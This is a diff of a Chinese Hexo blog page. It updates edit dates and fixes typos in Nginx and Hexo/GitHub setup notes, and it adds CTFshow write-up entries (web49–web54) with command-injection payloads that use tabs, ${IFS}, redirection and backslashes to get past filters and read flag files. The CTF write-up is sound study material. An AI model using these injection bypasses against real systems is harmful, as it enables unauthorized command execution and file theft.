@@ -220,7 +220,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-01-26 23:06:37" itemprop="dateModified" datetime="2022-01-26T23:06:37+08:00">2022-01-26</time>
+      <time title="Modified: 2022-02-08 22:27:23" itemprop="dateModified" datetime="2022-02-08T22:27:23+08:00">2022-02-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -273,7 +273,7 @@
 <p>*安装之后,使用命令，查看版本号 pcre-config version</p>
 <p>(2)安装其他依赖：yum -y install make zlib zlib-devel gcc-c++ libtool openssl openssl-devel</p>
 <p>(3)安装Nginx</p>
-<p>*把安装压缩文件放到linux系统中                                                                                                         *解压压缩文件                                                                                                                         *进入解压之后的目录，执行./configure 完成后，执行make &amp;&amp; make install   </p>
+<p>*把安装压缩文件放到linux系统中                                                                                                         *解压压缩文件                                                                                                     *进入解压之后的目录，执行./configure 完成后，执行make &amp;&amp; make install   </p>
 <p><img src="/2022/01/24/Nginx/image-20220125144037177.png" alt="image-20220125144037177"></p>
 <p>安装成功之后，在usr多出来个文件夹 local/nginx,在nginx有sbin有启动脚本,启动nginx</p>
 <p><img src="/2022/01/24/Nginx/image-20220125144427247.png" alt="image-20220125144427247"></p>
@@ -375,7 +375,7 @@
 <h3 id="5-4-动静分离实例"><a href="#5-4-动静分离实例" class="headerlink" title="5.4 动静分离实例"></a>5.4 动静分离实例</h3><p>1、什么是动静分离</p>
 <p><img src="/2022/01/24/Nginx/image-20220126141849632.png" alt="image-20220126141849632"></p>
 <p>一种是纯粹把静态文件独立成单独的域名,放在独立的服务器上,也是目前主流推崇的方案;另外一种方法就是动态跟静态文件混合在一起发布，通过nginx来分开。</p>
-<p>通过location指定不同的后缀名实现不同的请求转发。通过 expires参数设置，可以使浏览器缓存过期时间，减少与服务器之前的请求和流量。具体 Expires定义:是给一个资源设定一个过期时间,也就是说无需去服务端验证,直接通过浏览器自身确认是否过期即可，所以不会产生额外的流量。此种方法非常适合不经常变动的资源。(如果经常更新的文件，不建议使用Expires来缓存〉我这里设置3d，表示在这3天之内访问这个URL，发送一个请求，比对服务器该文件最后更新时间没有变化，则不会从服务器抓取，返回状态码304，如果有修改，则直接从服务器重新下载，返回状态码200。.</p>
+<p>通过location指定不同的后缀名实现不同的请求转发。通过 expires参数设置，可以使浏览器缓存过期时间，减少与服务器之前的请求和流量。具体 Expires定义:是给一个资源设定一个过期时间,也就是说无需去服务端验证,直接通过浏览器自身确认是否过期即可，所以不会产生额外的流量。此种方法非常适合不经常变动的资源。(如果经常更新的文件，不建议使用Expires来缓存〉我这里设置3d，表示在这3天之内访问这个URL，发送一个请求，比对服务器该文件最后更新时间没有变化，则不会从服务器抓取，返回状态码304，如果有修改，则直接从服务器重新下载，返回状态码200。</p>
 <p>2、准备工作</p>
 <p>（1）在Linux系统中准备静态资源，用于进行访问   根目录下创建data文件夹，在data文件夹下创建www文件夹和image文件夹，然后在里面放如下文件</p>
 <p><img src="/2022/01/24/Nginx/image-20220126150518601.png" alt="image-20220126150518601"></p>
@@ -555,7 +555,7 @@
 <p>npm install hexo-deployer-git –save</p>
 <p> 3.输入cd ~/.ssh,如果出现入下图情况，说明不存在.ssh</p>
 <p><img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134422521.png" alt="image-20220120134422521"></p>
-<p> 解决方法：输入 $ ssh-keygen -t rsa -C “<a href="mailto:&#120;&#x78;&#x78;&#120;&#120;&#x78;&#120;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#120;&#x78;&#x78;&#120;&#120;&#x78;&#120;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;</a>“(自己邮箱) 再次如下图进行操作，出现相同文件说明成功</p>
+<p> 解决方法：输入 $ ssh-keygen -t rsa -C “<a href="mailto:&#x78;&#120;&#120;&#120;&#x78;&#x78;&#120;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#x78;&#120;&#120;&#120;&#x78;&#x78;&#120;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a>“(自己邮箱) 再次如下图进行操作，出现相同文件说明成功</p>
 <img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134448931.png" alt="image-20220120134448931" style="zoom:80%;">
 
 <p>4.输入eval “$(ssh-agent -s)”，添加密钥到ssh-agent</p>
@@ -565,7 +565,7 @@
 
 <p><img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134641323.png" alt="image-20220120134641323"></p>
 <p>填写key<img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134719640.png" alt="image-20220120134719640"></p>
-<p>6.输入ssh -T <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#109;</a>，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了（有一个会让你输入 yes）</p>
+<p>6.输入ssh -T <a href="mailto:&#103;&#x69;&#116;&#64;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#99;&#111;&#x6d;">&#103;&#x69;&#116;&#64;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#99;&#111;&#x6d;</a>，测试添加ssh是否成功。如果看到Hi后面是你的用户名，就说明成功了（有一个会让你输入 yes）</p>
 <p>7.设置你的账号信息<img src="/2022/01/20/BLOG-%E6%90%AD%E5%BB%BA/image-20220120134805292.png" alt="image-20220120134805292"></p>
 <p>name和email后写自己的即可</p>
 <p>8.部署到github  hexo d     使用用户名.github.io 即可访问自己博客 </p>
@@ -668,7 +668,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-01-27 23:10:04" itemprop="dateModified" datetime="2022-01-27T23:10:04+08:00">2022-01-27</time>
+      <time title="Modified: 2022-02-07 13:42:23" itemprop="dateModified" datetime="2022-02-07T13:42:23+08:00">2022-02-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -687,14 +687,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Symbols count in article: </span>
-      <span>12k</span>
+      <span>13k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>11 mins.</span>
+      <span>12 mins.</span>
     </span>
 </div>
 
@@ -1087,7 +1087,7 @@
 <p>过滤了分号和cat</p>
 <p>payload:?c=tac flag.php||</p>
 <p>补充：</p>
-<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">more:</span>一页一页的显示档案内容</span><br><span class="line"><span class="symbol">less:</span>与 more 类似</span><br><span class="line"><span class="symbol">head:</span>查看头几行</span><br><span class="line"><span class="symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"><span class="symbol">tail:</span>查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line"><span class="symbol">od:</span>以二进制的方式读取档案内容</span><br><span class="line"><span class="symbol">vi:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">vim:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">sort:</span>可以查看</span><br><span class="line"><span class="symbol">uniq:</span>可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">more:</span>一页一页的显示档案内容</span><br><span class="line"><span class="symbol">less:</span>与 more 类似</span><br><span class="line"><span class="symbol">head:</span>查看头几行</span><br><span class="line"><span class="symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"><span class="symbol">tail:</span>查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line"><span class="symbol">od:</span>以二进制的方式读取档案内容</span><br><span class="line"><span class="symbol">vi:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">vim:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">sort:</span>可以查看</span><br><span class="line"><span class="symbol">uniq:</span>可以查看，uniq用于重复数据处理,使用前先sort排序。</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep 用于查找文件里符合条件的字符串。</span><br><span class="line">strings</span><br><span class="line">paste 可以查看文件，从指定的文件中读取输入，从一个或多个文件中连接行</span><br></pre></td></tr></table></figure>
 
 <h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p><img src="/2022/01/20/CTFshow/image-20220127223555173.png" alt="image-20220127223555173"></p>
 <p>payload:?c=tac fla*.php||</p>
@@ -1105,6 +1105,32 @@
 <p>payload: ?c=tac%09fla?.php||</p>
 <h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p><img src="/2022/01/20/CTFshow/image-20220127230657232.png" alt="image-20220127230657232"></p>
 <p>payload: ?c=tac%09fla?.php||</p>
+<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p><img src="/2022/01/20/CTFshow/image-20220128211059961.png" alt="image-20220128211059961"></p>
+<p>payload: ?c=tac%09fla?.php||</p>
+<p>因为%09是编码，浏览器对他自动解码为一个水平制表符，而不是为数字，也不是%</p>
+<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p><img src="/2022/01/20/CTFshow/image-20220128215058673.png" alt="image-20220128215058673"></p>
+<p>%09 %26被过滤了 使用重定向符&lt;&gt;代替空格，，但是&lt;&gt;后面不能跟有通配符，&lt;&gt;和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替,我们通过反斜杠<code>\</code>来绕过过滤的flag<img src="/2022/01/20/CTFshow/image-20220128220043797.png" alt="image-20220128220043797"></p>
+<p>payload:?c=tac&lt;&gt;fla\g.php||</p>
+<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p><img src="/2022/01/20/CTFshow/image-20220128220619948.png" alt="image-20220128220619948"></p>
+<p>tac也被过滤了</p>
+<p>使用反斜杠<code>\</code>绕过,或者利用<code>nl</code>替代<code>tac</code>，nl 命令读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。 </p>
+<p>payload：?c=ta\c&lt;&gt;fla\g.php||   或者 ?c=nl&lt;&gt;fla\g.php|| 查看网页源代码</p>
+<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p><img src="/2022/01/20/CTFshow/image-20220128221324732.png" alt="image-20220128221324732"></p>
+<p>也过滤了重定向符，没过滤$</p>
+<p>?c=ta\c${IFS}fla\g.php||   或  ?c=nl${IFS}fla\g.php||</p>
+<p><img src="/2022/01/20/CTFshow/image-20220128221645044.png" alt="image-20220128221645044"></p>
+<p>但是是假的</p>
+<p>看下根目录文件   ?c=ls${IFS}/||   <img src="/2022/01/20/CTFshow/image-20220128221925099.png" alt="image-20220128221925099"></p>
+<p>读取即可   ?c=nl${IFS}/fla\g||    ?c=ca\t${IFS}/fla\g||</p>
+<p>  <img src="/2022/01/20/CTFshow/image-20220128222111942.png" alt="image-20220128222111942"></p>
+<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p><img src="/2022/01/20/CTFshow/image-20220129115224616.png" alt="image-20220129115224616"></p>
+<p>payload : ?c=ca\t${IFS}fla\g.php</p>
+<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p><img src="/2022/01/20/CTFshow/image-20220129115722029.png" alt="image-20220129115722029"></p>
+<p>?c=ls${IFS} 得到</p>
+<p><img src="/2022/01/20/CTFshow/image-20220129120340261.png" alt="image-20220129120340261"></p>
+<p>过滤了;|cat|flag|空格|数字|查看文件命令nl等|`|%|\x09(空格)|\x26(&amp;)|&lt;|&gt;</p>
+<p>payload :  ?c=paste${IFS}fla?.php</p>
+<p>?c=grep${IFS}%27</p>
 
       
     </div>
@@ -1235,7 +1261,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Symbols count total">19k</span>
+    <span title="Symbols count total">20k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
